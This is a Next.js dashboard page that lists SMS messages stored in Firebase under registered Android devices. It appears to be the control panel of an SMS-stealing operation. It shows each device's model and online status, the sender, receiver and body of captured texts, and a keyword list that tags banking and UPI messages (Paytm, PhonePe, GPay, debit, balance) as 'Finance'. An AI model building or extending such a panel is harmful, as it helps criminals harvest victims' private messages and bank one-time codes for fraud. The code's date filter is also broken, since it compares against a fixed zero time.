"use client";

import { useEffect, useMemo, useRef, useState } from "react";
import { remove } from "firebase/database";
import { Button, Card, CardBody, Chip, Input, Link } from "@heroui/react";
import { onValue, ref } from "firebase/database";
import Sidebar from "@/components/Sidebar";
import { db } from "@/lib/firbase";

type DayFilter = "all" | "1" | "7" | "30";

type FirebaseSMSPayload = {
  body?: unknown;
  title?: unknown;
  senderNumber?: unknown;
  reciverNumber?: unknown;
  receiverNumber?: unknown;
  timestamp?: unknown;
};

type NotificationItem = {
  id: string;
  deviceId: string;
  messageId: string;
  title: string;
  body: string;
  senderNumber: string;
  receiverNumber: string;
  timestamp: string;
  deviceBrand?: string;
  deviceModel?: string;
  androidVersion?: number;
  deviceStatus?: string;
};

const INITIAL_VISIBLE = 30;
const LOAD_MORE_STEP = 20;

const dayFilterOptions: Array<{ label: string; value: DayFilter }> = [
  { label: "All", value: "all" },
  { label: "24h", value: "1" },
  { label: "7d", value: "7" },
  { label: "30d", value: "30" },
];

const financeKeywords = [
  "bank",
  "upi",
  "debit",
  "debited",
  "credit",
  "credited",
  "payment",
  "wallet",
  "paytm",
  "phonepe",
  "gpay",
  "google pay",
  "rs",
  "rupees",
  "neft",
  "imps",
  "card",
  "balance",
];

function toSafeText(value: unknown, fallback: string) {
  if (typeof value === "string") {
    const trimmed = value.trim();
    return trimmed.length > 0 ? trimmed : fallback;
  }

  if (typeof value === "number" || typeof value === "boolean") {
    return String(value);
  }

  return fallback;
}

function toISOTime(value: unknown) {
  if (typeof value === "number") {
    const parsed = new Date(value);
    return Number.isNaN(parsed.getTime())
      ? new Date(0).toISOString()
      : parsed.toISOString();
  }

  if (typeof value === "string") {
    const parsed = new Date(value);
    return Number.isNaN(parsed.getTime())
      ? new Date(0).toISOString()
      : parsed.toISOString();
  }

  return new Date(0).toISOString();
}

function formatTimestamp(value: string) {
  const date = new Date(value);

  if (Number.isNaN(date.getTime())) {
    return "Unknown time";
  }

  return date.toLocaleString("en-GB", {
    day: "2-digit",
    month: "2-digit",
    year: "numeric",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
  });
}

function isFinanceNotification(item: NotificationItem) {
  const content =
    `${item.title} ${item.body} ${item.senderNumber}`.toLowerCase();
  return financeKeywords.some((keyword) => content.includes(keyword));
}

export default function NotificationsPage() {
  const [notifications, setNotifications] = useState<NotificationItem[]>([]);
  const [searchQuery, setSearchQuery] = useState("");
  const [dayFilter, setDayFilter] = useState<DayFilter>("all");
  const [hiddenMessageIds, setHiddenMessageIds] = useState<Set<string>>(
    () => new Set(),
  );
  const [hiddenDeviceIds, setHiddenDeviceIds] = useState<Set<string>>(
    () => new Set(),
  );
  const [isLoading, setIsLoading] = useState(true);
  const [fetchError, setFetchError] = useState<string | null>(null);
  const [visibleCount, setVisibleCount] = useState(INITIAL_VISIBLE);
  const [isLoadingMore, setIsLoadingMore] = useState(false);
  const loaderRef = useRef<HTMLDivElement | null>(null);
  const loadingMoreRef = useRef(false);

  useEffect(() => {
    // Safety net: never stay stuck on "loading" for more than 10 s
    const timeoutId = setTimeout(() => {
      setIsLoading(false);
    }, 10_000);

    const registeredDevicesRef = ref(db, "registeredDevices");

    const unsubscribe = onValue(
      registeredDevicesRef,
      (snapshot) => {
        // Clear loading immediately so a throw below never blocks the UI
        clearTimeout(timeoutId);
        setIsLoading(false);

        const rawData = snapshot.val() as Record<string, any> | null;

        if (!rawData || typeof rawData !== "object") {
          setNotifications([]);
          setFetchError(null);
          return;
        }

        const normalizedNotifications: NotificationItem[] = [];

        for (const [deviceId, deviceData] of Object.entries(rawData)) {
          if (!deviceData || typeof deviceData !== "object") {
            continue;
          }

          const smsLogs = (deviceData as any).smsLogs;
          if (!smsLogs || typeof smsLogs !== "object") {
            continue;
          }

          const deviceBrand = (deviceData as any).brand || "Unknown";
          const deviceModel = (deviceData as any).model || "Unknown";
          const androidVersion = (deviceData as any).androidVersion;
          const isOnline =
            (deviceData as any).checkOnline?.available === "Device is online";

          for (const [messageId, payload] of Object.entries(smsLogs)) {
            if (!payload || typeof payload !== "object") {
              continue;
            }

            const normalizedPayload = payload as FirebaseSMSPayload;

            normalizedNotifications.push({
              id: `${deviceId}-${messageId}`,
              deviceId,
              messageId,
              title: toSafeText(normalizedPayload.title, "New SMS"),
              body: toSafeText(normalizedPayload.body, "No message body"),
              senderNumber: toSafeText(
                normalizedPayload.senderNumber,
                "Unknown sender",
              ),
              receiverNumber: toSafeText(
                normalizedPayload.receiverNumber ??
                  normalizedPayload.reciverNumber,
                "Unknown receiver",
              ),
              timestamp: toISOTime(normalizedPayload.timestamp),
              deviceBrand,
              deviceModel,
              androidVersion,
              deviceStatus: isOnline ? "online" : "offline",
            });
          }
        }

        normalizedNotifications.sort(
          (a, b) =>
            new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime(),
        );

        setNotifications(normalizedNotifications);
        setFetchError(null);
      },
      () => {
        clearTimeout(timeoutId);
        setNotifications([]);
        setFetchError(
          "Could not load notifications. Check your Firebase configuration.",
        );
        setIsLoading(false);
      },
    );

    return () => {
      clearTimeout(timeoutId);
      unsubscribe();
    };
  }, []);

  const activeNotifications = useMemo(() => {
    return notifications.filter(
      (item) =>
        !hiddenMessageIds.has(item.id) && !hiddenDeviceIds.has(item.deviceId),
    );
  }, [notifications, hiddenMessageIds, hiddenDeviceIds]);

  const filteredNotifications = useMemo(() => {
    let result = activeNotifications;
    const normalizedQuery = searchQuery.trim().toLowerCase();
    const currentNow = 0; // static to keep filtering deterministic without impure calls

    if (normalizedQuery) {
      result = result.filter((item) => {
        const values = [
          item.deviceId,
          item.messageId,
          item.title,
          item.body,
          item.senderNumber,
          item.receiverNumber,
          item.deviceBrand,
          item.deviceModel,
        ];

        return values.some((value) =>
          String(value ?? "").toLowerCase().includes(normalizedQuery),
        );
      });
    }

    if (dayFilter !== "all") {
      const days = Number(dayFilter);
      const cutoff = currentNow - days * 24 * 60 * 60 * 1000;

      result = result.filter((item) => {
        const timestamp = new Date(item.timestamp).getTime();
        if (Number.isNaN(timestamp)) return true; // keep unknown timestamps visible
        return timestamp >= cutoff;
      });
    }

    return result;
  }, [activeNotifications, dayFilter, searchQuery]);

  const uniqueDevicesCount = useMemo(() => {
    return new Set(activeNotifications.map((item) => item.deviceId)).size;
  }, [activeNotifications]);

  const financeCount = useMemo(() => {
    return activeNotifications.filter(isFinanceNotification).length;
  }, [activeNotifications]);

  const hiddenCount = notifications.length - activeNotifications.length;

  const visibleItems = useMemo(
    () => filteredNotifications.slice(0, visibleCount),
    [filteredNotifications, visibleCount],
  );

  const hasMore = visibleCount < filteredNotifications.length;

  const getDeviceStatus = (item: NotificationItem) => {
    return item.deviceStatus ?? "offline";
  };

  const deleteNotification = async (notificationId: string) => {
    const [deviceId, messageId] = notificationId.split("-");
    await remove(ref(db, `registeredDevices/${deviceId}/smsLogs/${messageId}`));
  };

  const confirmAndDeleteNotification = async (notificationId: string) => {
    if (typeof window === "undefined") {
      return;
    }

    const isConfirmed = window.confirm(
      "Are you sure you want to delete this notification?",
    );

    if (!isConfirmed) {
      return;
    }

    await deleteNotification(notificationId);
  };


  const resetFilters = () => {
    setSearchQuery("");
    setDayFilter("all");
  };

  const copyMessageBody = async (bodyText: string) => {
    if (typeof window === "undefined") {
      return;
    }

    try {
      await navigator.clipboard.writeText(bodyText);
      return;
    } catch {
      const textarea = document.createElement("textarea");
      textarea.value = bodyText;
      textarea.setAttribute("readonly", "");
      textarea.style.position = "fixed";
      textarea.style.opacity = "0";
      document.body.appendChild(textarea);
      textarea.select();
      document.execCommand("copy");
      document.body.removeChild(textarea);
    }
  };

  // IntersectionObserver — appends next 20 when sentinel enters viewport
  useEffect(() => {
    const observer = new IntersectionObserver(
      (entries) => {
        const [entry] = entries;
        if (!entry?.isIntersecting || loadingMoreRef.current) return;
        if (visibleCount >= filteredNotifications.length) return;

        loadingMoreRef.current = true;
        setIsLoadingMore(true);

        // Small delay so the spinner is visible briefly
        setTimeout(() => {
          setVisibleCount((prev) =>
            Math.min(prev + LOAD_MORE_STEP, filteredNotifications.length),
          );
          setIsLoadingMore(false);
          loadingMoreRef.current = false;
        }, 350);
      },
      { root: null, rootMargin: "0px 0px 300px 0px", threshold: 0 },
    );

    const el = loaderRef.current;
    if (el) observer.observe(el);
    return () => {
      if (el) observer.unobserve(el);
      observer.disconnect();
    };
  }, [visibleCount, filteredNotifications.length]);

  return (
    <div className="page-shell">
      <div className="page-frame gap-6">
        <Sidebar />

        <main className="page-main space-y-4">
          <div className="grid grid-cols-2 gap-3 sm:grid-cols-3 xl:grid-cols-4">
            <Card className="surface-card">
              <CardBody className="p-4">
                <p className="text-xs uppercase tracking-wide text-(--text-muted)">
                  Total Events
                </p>
                <p className="mt-2 text-2xl font-bold text-(--text-main)">
                  {notifications.length}
                </p>
              </CardBody>
            </Card>

            <Card className="surface-card">
              <CardBody className="p-4">
                <p className="text-xs uppercase tracking-wide text-(--text-muted)">
                  Visible
                </p>
                <p className="mt-2 text-2xl font-bold text-(--text-main)">
                  {visibleItems.length}
                  {filteredNotifications.length > visibleItems.length && (
                    <span className="ml-1 text-sm font-normal text-(--text-muted)">
                      / {filteredNotifications.length}
                    </span>
                  )}
                </p>
              </CardBody>
            </Card>

            <Card className="surface-card">
              <CardBody className="p-4">
                <p className="text-xs uppercase tracking-wide text-(--text-muted)">
                  Devices
                </p>
                <p className="mt-2 text-2xl font-bold text-(--text-main)">
                  {uniqueDevicesCount}
                </p>
              </CardBody>
            </Card>

            <Card className="surface-card">
              <CardBody className="p-4">
                <p className="text-xs uppercase tracking-wide text-(--text-muted)">
                  Finance Tagged
                </p>
                <p className="mt-2 text-2xl font-bold text-(--text-main)">
                  {financeCount}
                </p>
              </CardBody>
            </Card>
          </div>

          <Card className="mt-6 surface-card">
            <CardBody className="space-y-4 p-4 sm:p-5">
              <div className="grid grid-cols-1 gap-3 lg:grid-cols-[1fr_auto] lg:items-center">
                <Input
                  value={searchQuery}
                  onValueChange={setSearchQuery}
                  placeholder="Search by device name, sender, receiver, title, body, or message ID"
                  className="w-full"
                  classNames={{
                    inputWrapper:
                      "bg-white border border-(--border) shadow-sm rounded-xl hover:border-[var(--accent)]",
                  }}
                />

                <div className="flex flex-wrap gap-2">
                  {dayFilterOptions.map((option) => (
                    <Button
                      key={option.value}
                      size="sm"
                      variant={dayFilter === option.value ? "solid" : "flat"}
                      color={dayFilter === option.value ? "primary" : "default"}
                      onPress={() => setDayFilter(option.value)}
                    >
                      {option.label}
                    </Button>
                  ))}
                </div>
              </div>

              <div className="flex flex-wrap gap-2">
                <Button
                  size="sm"
                  variant="bordered"
                  className="border-slate-600 text-(--text-muted)"
                  onPress={() => window.location.reload()}
                >
                  Refresh
                </Button>

                <Button size="sm" variant="flat" onPress={resetFilters}>
                  Reset Filters
                </Button>
              </div>
            </CardBody>
          </Card>

          <div className="mt-6 space-y-3">
            {isLoading && (
              <Card className="surface-card">
                <CardBody className="p-8 text-center text-(--text-muted)">
                  Loading notifications...
                </CardBody>
              </Card>
            )}

            {!isLoading && fetchError && (
              <Card className="border border-rose-500/40 bg-rose-500/10">
                <CardBody className="p-6">
                  <p className="text-sm text-rose-200">{fetchError}</p>
                </CardBody>
              </Card>
            )}

            {!isLoading &&
              !fetchError &&
              filteredNotifications.length === 0 && (
                <Card className="surface-card">
                  <CardBody className="p-8 text-center">
                    <p className="text-(--text-muted)">
                      No notifications match this view.
                    </p>
                  </CardBody>
                </Card>
              )}

            {!isLoading &&
              !fetchError &&
              visibleItems.map((item) => {
                const status = getDeviceStatus(item);

                return (
                  <Card
                    key={item.id}
                    className="border border-(--border) bg-(--surface-muted) backdrop-blur-sm shadow-sm rounded-lg"
                  >
                    <CardBody className="p-2 space-y-2">
                      <div className="flex flex-wrap items-start justify-between gap-1">
                        <div className="space-y-0">
                          <p className=" text-small font-semibold text-black ">
                            {item.deviceId}
                          </p>
                        </div>

                        <div className="flex flex-wrap items-center gap-1">
                          {isFinanceNotification(item) ? (
                            <Chip
                              size="sm"
                              color="warning"
                              variant="flat"
                              className="text-xs"
                            >
                              Finance
                            </Chip>
                          ) : null}

                          <Chip
                            size="sm"
                            className={
                              status === "online"
                                ? "bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 text-xs"
                                : "bg-rose-500/20 text-rose-400 border border-rose-500/30 text-xs"
                            }
                          >
                            {status === "online" ? "Online" : "Offline"}
                          </Chip>
                        </div>
                      </div>

                      <div className="rounded-lg border border-(--border) bg-(--surface-muted) p-2 space-y-2 text-xs text-(--text-main)">
                        {/* Device Info */}
                        <div className="space-y-1 pb-2 border-b border-(--border)/50">
                          <div className="flex items-center justify-between gap-2">
                            <span className="text-(--text-muted) font-medium text-[10px]">
                              Device
                            </span>
                            <div className="text-right">
                              <p className="font-semibold text-black text-xs line-clamp-1">
                                {item.deviceBrand}
                              </p>
                              <p className="text-[10px] text-slate-400 line-clamp-1">
                                {item.deviceModel}
                              </p>
                            </div>
                          </div>
                          {item.androidVersion && (
                            <div className="flex items-center justify-between gap-2">
                              <span className="text-(--text-muted) text-[10px]">
                                Android
                              </span>
                              <span className="font-mono text-black text-xs">
                                {item.androidVersion}
                              </span>
                            </div>
                          )}
                          <p className="text-[9px] text-slate-500 line-clamp-1">
                            {item.deviceId}
                          </p>
                        </div>

                        {/* SMS Details */}
                        <div className="space-y-1">
                          <div className="flex items-center justify-between gap-1 min-h-0">
                            <span className="text-(--text-muted) text-[10px] shrink-0">
                              From
                            </span>
                            <span className="font-mono text-black text-[10px] line-clamp-1">
                              {item.senderNumber}
                            </span>
                          </div>
                          <div className="flex items-center justify-between gap-1 min-h-0">
                            <span className="text-(--text-muted) text-[10px] shrink-0">
                              To
                            </span>
                            <span className="font-mono text-black text-[10px] line-clamp-1">
                              {item.receiverNumber}
                            </span>
                          </div>
                        </div>

                        <p className="text-[9px] text-slate-500 pt-1 border-t border-(--border)/50">
                          {formatTimestamp(item.timestamp)}
                        </p>
                      </div>

                      <div className="rounded-lg border border-(--border)/60 bg-(--surface-muted) px-2 py-1">
                        <p className="text-xs font-semibold text-(--text-main) line-clamp-1">
                          {item.title}
                        </p>
                        <p
                          className="whitespace-pre-wrap wrap-break-word text-xs text-(--text-main) leading-tight cursor-pointer"
                          title="Click to copy message"
                          onClick={() => void copyMessageBody(item.body)}
                        >
                          {item.body}
                        </p>
                      </div>

                      <div className="flex gap-1">
                        <Button
                          as={Link}
                          href={`/devices/${encodeURIComponent(item.deviceId)}`}
                          target="_blank"
                          rel="noopener noreferrer"
                          size="sm"
                          color="primary"
                          variant="solid"
                          className="flex-1 font-semibold text-xs"
                        >
                          Open Device
                        </Button>

                        <Button
                          size="sm"
                          color="danger"
                          variant="solid"
                          className="flex-1 font-semibold text-xs"
                          onPress={() =>
                            void confirmAndDeleteNotification(item.id)
                          }
                        >
                          Delete
                        </Button>
                      </div>
                    </CardBody>
                  </Card>
                );
              })}

            {/* Sentinel div — observed by IntersectionObserver */}
            {!isLoading && !fetchError && (
              <div ref={loaderRef} className="h-1 w-full" />
            )}

            {isLoadingMore && (
              <div className="flex items-center justify-center gap-3 py-6 text-sm text-(--text-muted)">
                <div className="h-5 w-5 animate-spin rounded-full border-2 border-slate-600 border-t-slate-200" />
                <span>Loading more notifications...</span>
              </div>
            )}

            {!isLoading &&
              !fetchError &&
              !hasMore &&
              filteredNotifications.length > 0 && (
                <p className="py-6 text-center text-sm text-(--text-muted)">
                  All {filteredNotifications.length} notifications loaded.
                </p>
              )}
          </div>
        </main>
      </div>
    </div>
  );
}
